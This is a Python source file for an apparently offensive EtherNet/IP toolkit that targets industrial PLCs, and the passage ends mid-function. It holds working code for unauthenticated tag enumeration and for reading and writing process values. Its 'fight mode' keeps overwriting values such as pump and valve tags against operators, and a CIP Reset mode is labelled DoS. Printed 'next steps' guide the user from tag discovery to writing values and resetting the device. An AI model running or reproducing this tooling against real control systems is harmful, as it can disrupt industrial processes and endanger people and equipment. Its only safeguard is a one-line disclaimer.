#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       EtherNet/IP Toolkit — CoreFlareSec ICS Security       ║
║       CIP Object + Tag enumeration, read, write, attack     ║
║       pycomm3 primary | raw socket fallback                 ║
║       Usage: python3 ethernet_toolkit.py -h                 ║
╚══════════════════════════════════════════════════════════════╝
DISCLAIMER: Authorized pentesting and security research only.
"""

import socket
import struct
import time
import argparse
import sys

# ════════════════════════════════════════════════════════════════
# Color Scheme
# ════════════════════════════════════════════════════════════════
#  CYAN    = Info / Status / Connection
#  GREEN   = Success / Writable / Found
#  YELLOW  = Warning / Unknown
#  RED     = Vulnerability / Failed / Dangerous
#  NEON    = Values (bright green)
#  BLUE    = Section headers / Folders
#  BOLD    = Important labels

C_CYAN  = "\033[96m"
C_GREEN = "\033[92m"
C_YELLOW= "\033[93m"
C_RED   = "\033[91m"
C_NEON  = "\033[92m"
C_BLUE  = "\033[94m"
C_BOLD  = "\033[1m"
C_RESET = "\033[0m"

def cyan(s):   return f"{C_CYAN}{s}{C_RESET}"
def green(s):  return f"{C_GREEN}{s}{C_RESET}"
def yellow(s): return f"{C_YELLOW}{s}{C_RESET}"
def red(s):    return f"{C_RED}{s}{C_RESET}"
def neon(s):   return f"{C_NEON}{s}{C_RESET}"
def blue(s):   return f"{C_BLUE}{s}{C_RESET}"
def bold(s):   return f"{C_BOLD}{s}{C_RESET}"
def info(s):   return f"{cyan('[*]')} {s}"
def ok(s):     return f"{green('[+]')} {s}"
def warn(s):   return f"{yellow('[!]')} {s}"
def err(s):    return f"{red('[-]')} {s}"
def vuln(s):   return f"{red('[VULN]')} {red(s)}"

# ════════════════════════════════════════════════════════════════
# Constants
# ════════════════════════════════════════════════════════════════

ENIP_PORT = 44818
TIMEOUT   = 3

# CIP Object Classes
CIP_CLASSES = {
    0x01: "Identity",
    0x02: "Message Router",
    0x06: "Connection Manager",
    0x64: "Ethernet Link",
    0x65: "TCP/IP Interface",
    0x6B: "Symbol",
    0xF0: "Template",
    0x08: "Controller",
    0x0E: "Parameter",
    0x29: "Motor Data",
    0x46: "Motion Axis",
}

# CIP Services
CIP_SERVICES = {
    0x01: "Get_Attribute_All",
    0x05: "Reset",
    0x0E: "Get_Attribute_Single",
    0x10: "Set_Attribute_Single",
    0x11: "Find_Next_Object_Instance",
    0x55: "Get_Instance_Attribute_List",
}

# Identity Object attributes
IDENTITY_ATTRS = {
    1: "Vendor ID",
    2: "Device Type",
    3: "Product Code",
    4: "Revision",
    5: "Status",
    6: "Serial Number",
    7: "Product Name",
}

# pycomm3 availability
PYCOMM3_OK = False
try:
    from pycomm3 import LogixDriver
    PYCOMM3_OK = True
except ImportError:
    pass

BANNER = """
 ███████╗███╗   ██╗██╗██████╗ 
 ██╔════╝████╗  ██║██║██╔══██╗
 █████╗  ██╔██╗ ██║██║██████╔╝
 ██╔══╝  ██║╚██╗██║██║██╔═══╝ 
 ███████╗██║ ╚████║██║██║     
 ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     
  EtherNet/IP Toolkit — CoreFlareSec ICS Security
  pycomm3 primary | raw socket fallback
"""

HELP = r"""
MODES (-m):
  info     Discover device — List Identity + Security analysis
  enum     Enumerate CIP object classes (scan 0x01-0xFF)
  symbol   Enumerate Symbol Object (class 0x6B) — tag names
  cip      Unified CIP operations (replaces symbol with more options)
             --action symbol    Enumerate tags (controller + program + UDT)
             --action read      Read CIP attribute
             --action write     Write CIP attribute
             --action template  Enumerate UDT structures (class 0xF0)
             --action program   List program-scoped tags
             --action instance  Enumerate instances of a class
             --action all       Run all above
             --scope controller / program:<name> / all
             --filter <string>  Filter tag names
  read     Read CIP attribute or tag
  write    Write CIP attribute or tag
  monitor  Live monitor tags/objects (Ctrl+C stop)
  persist  Write continuously for X minutes (fight mode)
  reset    Send CIP Reset service (DoS) ⚠️
  forward  Test Forward Open (I/O connection)

OPTIONS:
  -p  --port       Port (default: 44818)
  --class          CIP class ID (hex) e.g. 0x6B
  --instance       Instance ID (default: 1)
  --attr           Attribute ID (default: 7)
  --tag            Tag name (for pycomm3) e.g. "Tank_Level"
  --tags           Multiple tags comma-separated "Tag1,Tag2,Tag3"
  --value          Value to write
  --interval       Monitor interval seconds (default: 2)
  --timeout        Persist duration minutes (default: 0=unlimited)
  --class-start    Enum class start (default: 1)
  --class-end      Enum class end (default: 100)

SEPARATOR:
  :  Multiple targets for persist/monitor
     --tag "Pump" --value 1 : --tag "Valve" --value 1

EXAMPLES:
  # Discover device
  python3 ethernet_toolkit.py 192.168.1.100 -m info

  # Enumerate CIP objects
  python3 ethernet_toolkit.py 192.168.1.100 -m enum

  # CIP mode — enumerate tags (all scopes)
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action symbol
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action symbol --scope all
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action symbol --filter flag
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action template
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action program
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action all
  python3 ethernet_toolkit.py 192.168.1.100 -m cip --action instance --class 0x6B

  # Legacy (still works)
  python3 ethernet_toolkit.py 192.168.1.100 -m symbol

  # Read Identity attribute
  python3 ethernet_toolkit.py 192.168.1.100 -m read \
    --class 0x01 --instance 1 --attr 7

  # Read tag (pycomm3)
  python3 ethernet_toolkit.py 192.168.1.100 -m read --tag "Tank_Level"

  # Write tag
  python3 ethernet_toolkit.py 192.168.1.100 -m write \
    --tag "Pump_Start" --value 1

  # Write CIP attribute
  python3 ethernet_toolkit.py 192.168.1.100 -m write \
    --class 0x6B --instance 5 --attr 3 --value 100

  # Monitor multiple tags
  python3 ethernet_toolkit.py 192.168.1.100 -m monitor \
    --tags "Tank_Level,Pump_Start,Valve_Open" --interval 1

  # Persist multiple tags (fight mode 5 min)
  python3 ethernet_toolkit.py 192.168.1.100 -m persist \
    --tag "Pump" --value 1 : --tag "Valve" --value 1 --timeout 5

  # Reset (DoS) ⚠️
  python3 ethernet_toolkit.py 192.168.1.100 -m reset

CIP CLASSES:
  0x01 = Identity       0x64 = Ethernet Link
  0x02 = Msg Router     0x65 = TCP/IP Interface
  0x06 = Conn Manager   0x6B = Symbol (tags) ← important
  0x08 = Controller     0xF0 = Template

TIMING:
  monitor/persist interval examples:
    --interval 0.5  = every 500ms
    --interval 1    = every 1s (default monitor)
    --interval 2    = every 2s (default persist)
"""

# ════════════════════════════════════════════════════════════════
# Raw EtherNet/IP Packet Builders
# ════════════════════════════════════════════════════════════════

def _list_identity():
    """Broadcast discover — no session needed"""
    cmd  = struct.pack('<H', 0x0063)   # List Identity
    cmd += struct.pack('<H', 0)        # length
    cmd += b'\x00' * 16               # handle, status, context, options
    return cmd

def _register_session():
    """Register Session — get session handle"""
    data   = struct.pack('<HH', 1, 0)  # protocol version=1, flags=0
    header = struct.pack('<HHI', 0x0065, len(data), 0)   # cmd, len, handle
    header += struct.pack('<I', 0)     # status
    header += b'\x00' * 8             # sender context
    header += struct.pack('<I', 0)    # options
    return header + data

def _build_cip_request(service, class_id, instance, attr=None, data=b''):
    """Build CIP explicit message request"""
    # CIP path
    path = bytes([0x20, class_id & 0xFF,
                  0x24, instance & 0xFF])
    if attr is not None:
        path += bytes([0x30, attr & 0xFF])
    path_words = len(path) // 2

    cip = bytes([service, path_words]) + path + data
    return cip

def _wrap_cip_in_enip(session_handle, cip_data):
    """Wrap CIP in EtherNet/IP Send RR Data"""
    # Interface Handle (0) + Timeout (10s) + Item count (2)
    # + null address item + connected data item
    cpf  = struct.pack('<I', 0)        # Interface Handle
    cpf += struct.pack('<H', 10)       # Timeout
    cpf += struct.pack('<H', 2)        # Item count
    cpf += struct.pack('<HH', 0, 0)   # Null address item
    cpf += struct.pack('<HH', 0xB2, len(cip_data))  # Unconnected data item
    cpf += cip_data

    header  = struct.pack('<HH', 0x006F, len(cpf))  # cmd, length
    header += struct.pack('<I', session_handle)       # session handle
    header += struct.pack('<I', 0)                   # status
    header += b'\x00' * 8                            # sender context
    header += struct.pack('<I', 0)                   # options
    return header + cpf

def _parse_enip_response(resp):
    """Extract CIP response from EtherNet/IP packet"""
    try:
        if len(resp) < 24:
            return None, None
        # cmd=0, len=2, handle=4, status=8, ...
        # CPF starts at offset 24
        # skip interface handle(4) + timeout(2) + item_count(2) = 8 bytes
        # then null addr item (4) + data item header (4) = 8 bytes
        # data starts at 24+8+8 = 40
        offset = 40
        if len(resp) <= offset:
            return None, None
        service  = resp[offset] & 0x7F   # response service = request | 0x80
        reserved = resp[offset+1]
        gen_status = resp[offset+2]
        add_status_size = resp[offset+3]
        data_start = offset + 4 + (add_status_size * 2)
        data = resp[data_start:]
        return gen_status, data
    except Exception:
        return None, None

# ════════════════════════════════════════════════════════════════
# Transport
# ════════════════════════════════════════════════════════════════

class ENIPTransport:
    def __init__(self, host, port=ENIP_PORT):
        self.host    = host
        self.port    = port
        self.sock    = None
        self.session = 0
        self.backend = None

    def connect(self):
        try:
            self.sock = socket.socket()
            self.sock.settimeout(TIMEOUT)
            self.sock.connect((self.host, self.port))
            # Register session
            self.sock.send(_register_session())
            resp = self.sock.recv(1024)
            if len(resp) >= 8:
                self.session = struct.unpack('<I', resp[4:8])[0]
                self.backend = "raw/tcp"
                return True
        except Exception as e:
            return False
        return False

    def disconnect(self):
        try:
            if self.sock:
                self.sock.close()
        except:
            pass
        self.sock = None
        self.session = 0

    def send_cip(self, service, class_id, instance, attr=None, data=b''):
        """Send CIP request, return (status, response_data)"""
        try:
            cip  = _build_cip_request(service, class_id, instance, attr, data)
            pkt  = _wrap_cip_in_enip(self.session, cip)
            self.sock.send(pkt)
            resp = self.sock.recv(4096)
            return _parse_enip_response(resp)
        except Exception as e:
            return None, None

    def get_attr(self, class_id, instance, attr):
        """Get_Attribute_Single (service 0x0E)"""
        return self.send_cip(0x0E, class_id, instance, attr)

    def get_attr_all(self, class_id, instance):
        """Get_Attribute_All (service 0x01)"""
        return self.send_cip(0x01, class_id, instance)

    def set_attr(self, class_id, instance, attr, value_bytes):
        """Set_Attribute_Single (service 0x10)"""
        return self.send_cip(0x10, class_id, instance, attr, value_bytes)

    def reset_device(self):
        """Reset service (0x05) — DoS"""
        return self.send_cip(0x05, 0x01, 1)

    def list_identity_udp(self):
        """List Identity via UDP broadcast"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(_list_identity(), (self.host, self.port))
            resp, addr = s.recvfrom(4096)
            s.close()
            return resp
        except:
            return None

# ════════════════════════════════════════════════════════════════
# pycomm3 wrapper
# ════════════════════════════════════════════════════════════════

def pycomm3_read(host, tag):
    if not PYCOMM3_OK:
        return None, "pycomm3 not installed"
    try:
        with LogixDriver(host) as plc:
            result = plc.read(tag)
            return result.value, None
    except Exception as e:
        return None, str(e)

def pycomm3_write(host, tag, value):
    if not PYCOMM3_OK:
        return False, "pycomm3 not installed"
    try:
        with LogixDriver(host) as plc:
            result = plc.write((tag, value))
            return result.error is None, result.error
    except Exception as e:
        return False, str(e)

def pycomm3_get_tags(host):
    if not PYCOMM3_OK:
        return None, "pycomm3 not installed"
    try:
        with LogixDriver(host) as plc:
            return plc.get_tag_list(), None
    except Exception as e:
        return None, str(e)

# ════════════════════════════════════════════════════════════════
# Mode 1: Info
# ════════════════════════════════════════════════════════════════

def mode_info(host, port):
    print(f"\n{bold(blue('[*]'))} {cyan('EtherNet/IP Device Info')} — {bold(host)}:{port}")
    SEP = "─" * 60
    print(SEP)

    t = ENIPTransport(host, port)

    # UDP broadcast discover
    print(f"\n{info('List Identity (UDP broadcast)...')}")
    resp = t.list_identity_udp()
    if resp and len(resp) > 24:
        print(f"  {ok('Device responded to broadcast')}")
        # parse identity data (offset 24+)
        try:
            data = resp[24:]
            # Item type=0x000C, length, encap_protocol, vendor, device_type, product_code, revision, status, serial, name_len, name
            if len(data) >= 10:
                idx = 0
                # skip item type+length (4 bytes) + encap_version (2)
                idx = 6
                vendor = struct.unpack('<H', data[idx:idx+2])[0]; idx+=2
                dtype  = struct.unpack('<H', data[idx:idx+2])[0]; idx+=2
                pcode  = struct.unpack('<H', data[idx:idx+2])[0]; idx+=2
                rev_major = data[idx]; rev_minor = data[idx+1]; idx+=2
                status = struct.unpack('<H', data[idx:idx+2])[0]; idx+=2
                serial = struct.unpack('<I', data[idx:idx+4])[0]; idx+=4
                name_len = data[idx]; idx+=1
                name = data[idx:idx+name_len].decode(errors='ignore')
                print(f"  {bold('Vendor ID'):16}: {cyan(str(vendor))}")
                print(f"  {bold('Device Type'):16}: {cyan(str(dtype))}")
                print(f"  {bold('Product Code'):16}: {cyan(str(pcode))}")
                print(f"  {bold('Revision'):16}: {cyan(f'{rev_major}.{rev_minor}')}")
                print(f"  {bold('Status'):16}: {cyan(hex(status))}")
                print(f"  {bold('Serial'):16}: {cyan(hex(serial))}")
                print(f"  {bold('Product Name'):16}: {neon(name)}")
        except Exception:
            print(f"  {warn('Cannot parse identity data')}")
    else:
        print(f"  {warn('No UDP broadcast response')}")

    # TCP explicit connect
    print(f"\n{info('Connecting via TCP explicit messaging...')}")
    if t.connect():
        print(f"  {ok(f'Session established: {hex(t.session)}')} {green(chr(10003))}")

        # Read Identity attributes
        print(f"\n{info('Reading Identity Object (class=0x01, inst=1):')}")
        print(f"  {'Attr':>5} | {'Name':20} | Value")
        print(f"  {'─'*50}")
        for attr_id, attr_name in IDENTITY_ATTRS.items():
            status, data = t.get_attr(0x01, 1, attr_id)
            if status == 0 and data:
                # decode based on attr type
                try:
                    if attr_id == 7:  # Product Name (string)
                        length = data[0]
                        val = data[1:1+length].decode(errors='ignore')
                    elif attr_id == 4:  # Revision (UINT+UINT)
                        val = f"{data[0]}.{data[1]}"
                    elif attr_id == 6:  # Serial (UDINT)
                        val = hex(struct.unpack('<I', data[:4])[0])
                    elif attr_id == 5:  # Status (WORD)
                        val = hex(struct.unpack('<H', data[:2])[0])
                    elif len(data) >= 2:
                        val = struct.unpack('<H', data[:2])[0]
                    else:
                        val = data.hex()
                    print(f"  {attr_id:>5} | {attr_name:20} | {neon(str(val))}")
                except:
                    print(f"  {attr_id:>5} | {attr_name:20} | {data.hex()}")
            else:
                print(f"  {attr_id:>5} | {attr_name:20} | {yellow('N/A')}")

        t.disconnect()
    else:
        print(f"  {err('TCP connect failed')}")

    # pycomm3 info
    if PYCOMM3_OK:
        print(f"\n{info('pycomm3 tag list...')}")
        tags, error = pycomm3_get_tags(host)
        if tags:
            print(f"  {ok(f'Found {len(tags)} tags via pycomm3')}")
        else:
            print(f"  {warn(f'pycomm3: {error}')}")

    # Security Analysis
    print(f"\n{SEP}")
    print(f"{bold(blue('[*]'))} {bold('Security Analysis')}\n")
    print(f"  authentication : {red('NONE (default)')}  ← no login required")
    print(f"  encryption     : {red('NONE (default)')}  ← plaintext")
    print(f"  access_control : {yellow('unknown')}       (need write test)")
    print(f"  cip_security   : {yellow('unknown')}       (TLS/DTLS if enabled)")

    print(f"\n{bold(red('[*]'))} {bold('Vulnerability Assessment')}")
    print(f"  {vuln('No authentication — read/write without credentials')}")
    print(f"  {yellow('[INFO]')} Try: symbol enum → find process tags → write values")
    print(f"  {yellow('[INFO]')} Try: reset service → DoS (CIP service 0x05)")

    print(f"\n{SEP}")
    print(f"{bold(blue('[*]'))} {bold('Next Steps')}\n")
    port_flag = " -p {}".format(port) if port != ENIP_PORT else ""
    cmd = "python3 ethernet_toolkit.py {}{}".format(host, port_flag)
    print("  [1] CIP symbol enum:  {} -m cip --action symbol".format(cmd))
    print("  [2] Filter flag tag:  {} -m cip --action symbol --filter flag".format(cmd))
    print("  [3] Enum objects:     {} -m enum".format(cmd))
    print("  [4] Read attr:        {} -m cip --action read --class 0x01 --instance 1 --attr 7".format(cmd))
    print("  [5] Write attr:       {} -m cip --action write --class 0x6B --instance 1 --attr 1 --value 0".format(cmd))
    print("  [6] Monitor tags:     {} -m monitor --tags Tag1,Tag2 --interval 1".format(cmd))
    print("  [7] Reset (DoS):      {} -m reset".format(cmd))

# ════════════════════════════════════════════════════════════════
# Mode 2: Enum CIP Objects
# ════════════════════════════════════════════════════════════════

def mode_enum(host, port, class_start=1, class_end=100):
    print(f"\n{bold(blue('[*]'))} {cyan('CIP Object Enumeration')} — {bold(host)}")
    print(f"{info(f'Scanning class 0x{class_start:02X}-0x{class_end:02X}')}")
    print(f"{'─'*60}")

    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    print(ok(f"Session: {hex(t.session)}\n"))
    print(f"  {'Class':>7} | {'Name':20} | {'Status':8} | Data")
    print(f"  {'─'*60}")

    found = []
    for class_id in range(class_start, class_end+1):
        status, data = t.get_attr_all(class_id, 1)
        if status is not None:
            name = CIP_CLASSES.get(class_id, "unknown")
            if status == 0:
                preview = data.hex()[:20] if data else ""
                print(f"  {cyan(f'0x{class_id:02X}'):>12} | {bold(name):20} | {green('OK'):8} | {neon(preview)}")
                found.append(class_id)
            elif status == 0x08:  # Service not supported
                pass  # skip
            else:
                name = CIP_CLASSES.get(class_id, "")
                if name:  # only show known classes
                    print(f"  {cyan(f'0x{class_id:02X}'):>12} | {name:20} | {yellow(f'0x{status:02X}'):8} |")

    t.disconnect()
    print(f"\n{ok(f'Found {len(found)} responding classes: {[hex(c) for c in found]}')}")

# ════════════════════════════════════════════════════════════════
# Mode 3: Symbol/Tag Enumeration
# ════════════════════════════════════════════════════════════════

def mode_symbol(host, port):
    print(f"\n{bold(blue('[*]'))} {cyan('Symbol/Tag Enumeration')} — {bold(host)}")
    print(f"{'─'*60}")

    # Try pycomm3 first (better tag info)
    if PYCOMM3_OK:
        print(info("Trying pycomm3 tag list..."))
        tags, error = pycomm3_get_tags(host)
        if tags:
            print(ok(f"Found {len(tags)} tags via pycomm3\n"))
            print(f"  {'Tag Name':30} | {'Type':10} | {'Dim'}")
            print(f"  {'─'*60}")
            for tag in tags[:200]:  # limit display
                name = tag.tag_name
                dtype = str(tag.data_type)
                dim = str(getattr(tag, 'dimensions', ''))
                print(f"  {bold(name):35} | {cyan(dtype):15} | {dim}")
            if len(tags) > 200:
                print(f"  ... and {len(tags)-200} more")
            return

    # Fallback: raw CIP Symbol Object (0x6B) enumeration
    print(info("pycomm3 not available — using raw CIP Symbol Object (0x6B)"))
    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    print(ok(f"Session: {hex(t.session)}\n"))
    print(f"  {'Inst':>6} | {'Symbol Name':30} | {'Type':6} | Data")
    print(f"  {'─'*60}")

    found = []
    instance = 1
    while instance <= 65535:
        status, data = t.get_attr_all(0x6B, instance)
        if status is None:
            break
        if status == 0 and data and len(data) >= 4:
            try:
                sym_type = struct.unpack('<H', data[0:2])[0]
                name_len = data[2]
                name     = data[3:3+name_len].decode(errors='ignore').strip('\x00')
                if name:
                    preview = data[3+name_len:3+name_len+4].hex() if len(data) > 3+name_len else ""
                    print(f"  {instance:>6} | {bold(name):35} | {cyan(f'0x{sym_type:04X}'):10} | {neon(preview)}")
                    found.append({'instance': instance, 'name': name, 'type': sym_type})
            except:
                pass
        elif status == 0x08:  # no more instances
            break
        elif status == 0x05:  # instance not found
            break
        instance += 1

    t.disconnect()
    print(f"\n{ok(f'Found {len(found)} symbols')}")
    return found

# ════════════════════════════════════════════════════════════════
# Mode 4: Read
# ════════════════════════════════════════════════════════════════

def mode_read(host, port, class_id=None, instance=1, attr=None, tag=None):
    print(f"\n{bold(blue('[*]'))} {cyan('Read')} — {bold(host)}")
    print(f"{'─'*55}")

    # Tag mode (pycomm3)
    if tag:
        print(info(f"Reading tag: {bold(tag)}"))
        val, error = pycomm3_read(host, tag)
        if error:
            print(warn(f"pycomm3 failed: {error}"))
            print(info("Falling back to raw CIP..."))
        else:
            print(ok(f"Tag:   {bold(tag)}"))
            print(ok(f"Value: {neon(str(val))}"))
            return

    # Raw CIP mode
    if class_id is None:
        print(err("--class required (or --tag for pycomm3)"))
        return

    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    class_name = CIP_CLASSES.get(class_id, f"0x{class_id:02X}")
    attr_str   = f"attr={attr}" if attr else "all"
    print(info(f"class={cyan(f'0x{class_id:02X}')} ({class_name}) inst={instance} {attr_str}"))

    if attr is not None:
        status, data = t.get_attr(class_id, instance, attr)
    else:
        status, data = t.get_attr_all(class_id, instance)

    t.disconnect()

    if status == 0 and data:
        print(ok(f"Status: {green('OK')}"))
        print(ok(f"Raw:    {neon(data.hex())}"))
        # try decode
        if len(data) >= 4:
            try:
                as_int  = struct.unpack('<I', data[:4])[0]
                as_str  = data.decode(errors='replace').strip()
                print(ok(f"UINT32: {neon(str(as_int))}"))
                print(ok(f"String: {neon(repr(as_str[:50]))}"))
            except:
                pass
    else:
        print(err(f"Status: {red(f'0x{status:02X}' if status is not None else 'None')}"))

# ════════════════════════════════════════════════════════════════
# Mode 5: Write
# ════════════════════════════════════════════════════════════════

def mode_write(host, port, class_id=None, instance=1, attr=None,
               tag=None, value=None):
    print(f"\n{bold(blue('[*]'))} {cyan('Write')} — {bold(host)}")
    print(f"{'─'*55}")

    if value is None:
        print(err("--value required"))
        return

    # Tag mode (pycomm3)
    if tag:
        print(info(f"Writing tag: {bold(tag)} = {neon(str(value))}"))
        # read before
        before, _ = pycomm3_read(host, tag)
        print(f"  Before: {yellow(str(before))}")
        ok_write, error = pycomm3_write(host, tag, value)
        if ok_write:
            after, _ = pycomm3_read(host, tag)
            print(f"  After:  {neon(str(after))}")
            if str(after) == str(value):
                print(ok(f"Write {green('SUCCESS')} ✓"))
            else:
                print(warn(f"Value changed but mismatch: {after}"))
        else:
            print(err(f"Write failed: {error}"))
        return

    # Raw CIP mode
    if class_id is None or attr is None:
        print(err("--class and --attr required (or --tag for pycomm3)"))
        return

    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    # encode value
    try:
        v = int(value)
        value_bytes = struct.pack('<I', v)
    except:
        value_bytes = value.encode()

    class_name = CIP_CLASSES.get(class_id, f"0x{class_id:02X}")
    print(info(f"class={cyan(f'0x{class_id:02X}')} inst={instance} attr={attr} value={neon(str(value))}"))

    # read before
    status, before = t.get_attr(class_id, instance, attr)
    print(f"  Before: {yellow(before.hex() if before else 'N/A')}")

    # write
    status, _ = t.set_attr(class_id, instance, attr, value_bytes)

    # read after
    status2, after = t.get_attr(class_id, instance, attr)
    print(f"  After:  {neon(after.hex() if after else 'N/A')}")

    if status == 0:
        print(ok(f"Write {green('SUCCESS')} ✓"))
    else:
        print(err(f"Write status: 0x{status:02X}" if status else "Write failed"))

    t.disconnect()

# ════════════════════════════════════════════════════════════════
# Mode 6: Monitor (multiple tags/objects)
# ════════════════════════════════════════════════════════════════

def mode_monitor(host, port, tags=None, targets=None, interval=1):
    """
    tags    = ["Tank_Level", "Pump_Start", ...] via pycomm3
    targets = [(class_id, instance, attr), ...] via raw CIP
    """
    print(f"\n{bold(blue('[*]'))} {cyan('Monitor')} — {bold(host)} interval={interval}s (Ctrl+C stop)")
    print(f"{'─'*70}")

    if not tags and not targets:
        print(err("--tags or --targets required"))
        return

    # ── pycomm3 mode ─────────────────────────────────────────────
    if tags and PYCOMM3_OK:
        print(info(f"Monitoring {len(tags)} tags via pycomm3\n"))
        hdr = f"{'TIME':>10}"
        for t in tags:
            hdr += f" | {t[:14]:>14}"
        print(hdr)
        print("─" * (12 + len(tags)*17))

        prev = {}
        try:
            while True:
                ts  = time.strftime("%H:%M:%S")
                row = f"{ts:>10}"
                for tag in tags:
                    val, _ = pycomm3_read(host, tag)
                    p   = prev.get(tag)
                    if p is not None and str(p) != str(val):
                        display = f"*{val}*"
                        row += f" | {red(str(display)[:14]):>19}"
                    else:
                        row += f" | {neon(str(val)[:14]):>19}"
                    prev[tag] = val
                print(row)
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n{info('Monitor stopped')}")
        return

    # ── raw CIP mode ──────────────────────────────────────────────
    if tags:
        print(warn("pycomm3 not available — trying raw CIP Symbol Object..."))
        # map tag names to Symbol instances
        symbols = mode_symbol(host, port) or []
        sym_map = {s['name']: s['instance'] for s in symbols}
        targets = []
        for tag in tags:
            if tag in sym_map:
                targets.append((0x6B, sym_map[tag], None, tag))
            else:
                print(warn(f"Tag '{tag}' not found in symbol table"))

    if not targets:
        print(err("No valid targets"))
        return

    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    print(ok(f"Session: {hex(t.session)}\n"))
    hdr = f"{'TIME':>10}"
    for item in targets:
        label = item[3] if len(item) > 3 else f"0x{item[0]:02X}:{item[1]}"
        hdr += f" | {label[:12]:>12}"
    print(hdr)
    print("─" * (12 + len(targets)*15))

    prev = {}
    try:
        while True:
            ts  = time.strftime("%H:%M:%S")
            row = f"{ts:>10}"
            for item in targets:
                class_id, instance = item[0], item[1]
                attr = item[2] if item[2] else None
                label = item[3] if len(item) > 3 else f"0x{class_id:02X}"
                if attr:
                    status, data = t.get_attr(class_id, instance, attr)
                else:
                    status, data = t.get_attr_all(class_id, instance)
                if status == 0 and data:
                    try:
                        val = struct.unpack('<I', data[:4])[0]
                    except:
                        val = data.hex()[:8]
                    p = prev.get(label)
                    if p is not None and str(p) != str(val):
                        row += f" | {red(f'*{val}*')[:17]:>17}"
                    else:
                        row += f" | {neon(str(val)[:12]):>17}"
                    prev[label] = val
                else:
                    row += f" | {'ERR':>12}"
            print(row)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n{info('Monitor stopped')}")
    finally:
        t.disconnect()

# ════════════════════════════════════════════════════════════════
# Mode 7: Persist (Fight Mode)
# ════════════════════════════════════════════════════════════════

def mode_persist(host, port, tag_targets, interval=2, timeout_min=0):
    """
    tag_targets = [(tag_or_class, value, instance, attr), ...]
    """
    duration = f"{timeout_min} min" if timeout_min > 0 else "∞"
    print(f"\n{bold(blue('[*]'))} {red('Persist FIGHT MODE')} — {bold(host)}")
    print(f"{info(f'Duration={duration}  Interval={interval}s')}")
    print(f"{'─'*60}")

    deadline = time.time() + timeout_min*60 if timeout_min > 0 else float('inf')
    cycle    = 0

    try:
        while time.time() < deadline:
            cycle += 1
            ts     = time.strftime("%H:%M:%S")
            remain = f"remain={int(deadline-time.time())}s" if timeout_min > 0 else "∞"
            parts  = []

            for item in tag_targets:
                tag, value = item[0], item[1]
                if isinstance(tag, str) and PYCOMM3_OK:
                    # pycomm3 write
                    ok_write, _ = pycomm3_write(host, tag, value)
                    cur, _ = pycomm3_read(host, tag)
                    held = str(cur) == str(value)
                    parts.append(f"{tag}={cur}{'✓' if held else '✗'}")
                else:
                    # raw CIP write
                    class_id, instance, attr = item[0], item[1], item[2]
                    value = item[3]
                    t = ENIPTransport(host, port)
                    if t.connect():
                        vb = struct.pack('<I', int(value))
                        status, _ = t.set_attr(class_id, instance, attr, vb)
                        st2, data = t.get_attr(class_id, instance, attr)
                        cur = struct.unpack('<I', data[:4])[0] if data else None
                        t.disconnect()
                        parts.append(f"0x{class_id:02X}:{instance}={cur}{'✓' if status==0 else '✗'}")

            print(f"[{ts}] cycle={cycle} {remain} | {' | '.join(parts)}")
            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n{info('Persist stopped')}")

# ════════════════════════════════════════════════════════════════
# Mode 8: Reset (DoS)
# ════════════════════════════════════════════════════════════════

def mode_reset(host, port):
    print(f"\n{bold(red('[!]'))} {red('CIP Reset Service')} — {bold(host)}")
    print(warn("This will attempt to RESET the PLC — authorized use only!"))
    print(f"{'─'*55}")

    t = ENIPTransport(host, port)
    if not t.connect():
        print(err("Connection failed"))
        return

    print(info(f"Session: {hex(t.session)}"))
    print(info("Sending CIP Reset (service 0x05, class 0x01, inst 1)..."))

    status, data = t.reset_device()
    if status == 0:
        print(ok(red("Reset sent! Device may be rebooting...")))
    elif status is not None:
        print(warn(f"Status: 0x{status:02X} (may still have effect)"))
    else:
        print(err("No response (device may have reset immediately)"))

    t.disconnect()

# ════════════════════════════════════════════════════════════════
# Mode CIP — unified CIP operations
# ════════════════════════════════════════════════════════════════

def _decode_symbol_name(val):
    """Decode CIP symbol name — UTF-16LE, UTF-8, length-prefixed"""
    if not val:
        return ""
    if isinstance(val, (bytes, bytearray)):
        b = bytes(val).rstrip(b'\x00')
        if not b:
            return ""
        # UTF-16LE: every other byte is \x00
        if len(b) >= 4 and b[1] == 0 and b[3] == 0:
            try:
                return b.decode('utf-16-le', errors='ignore').rstrip('\x00').strip()
            except Exception:
                pass
        # length-prefixed UTF-8
        if b[0] < len(b):
            try:
                return b[1:1+b[0]].decode('utf-8', errors='ignore').strip()
            except Exception:
                pass
        # raw UTF-8
        return b.decode('utf-8', errors='ignore').strip()
    return str(val).strip() if val else ""


def _decode_cip_name(val):
    """Decode length-prefixed bytes from Symbol Object — same as cip.py decode_name"""
    if isinstance(val, (bytes, bytearray)):
        b = bytes(val)
        # detect UTF-16LE
        stripped = b.rstrip(b'\x00')
        if len(stripped) >= 4 and stripped[1] == 0 and stripped[3] == 0:
            try:
                return stripped.decode('utf-16-le', errors='ignore').replace('\x00','').strip()
            except Exception:
                pass
        # length-prefixed UTF-8 (CIP standard)
        if len(b) > 1 and b[0] < len(b):
            return b[1:1+b[0]].decode('utf-8', errors='ignore')
        return b.decode('utf-8', errors='ignore')
    return str(val) if val else ""


def _enum_symbols_cipdriver(host, port, name_filter=None, max_inst=200):
    """
    Enumerate CIP Symbol Object (0x6B) using pycomm3 CIPDriver
    Mirrors working cip.py exactly:
      service=0x0E, class_code=0x6B, instance=N, attribute=1
    """
    found = []
    try:
